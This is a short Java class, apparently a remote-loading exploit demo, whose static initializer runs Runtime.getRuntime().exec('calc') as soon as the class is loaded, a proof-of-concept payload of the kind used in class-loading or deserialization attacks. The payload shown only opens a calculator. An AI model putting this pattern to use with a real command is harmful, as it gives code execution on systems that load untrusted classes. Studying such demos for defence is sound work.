package server;

import java.io.IOException;

/**
 * Remote
 */
public class Person {

    public Person() {
        System.out.println("in remote constructor");
    }

    static {
        System.out.println("in remote static");
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
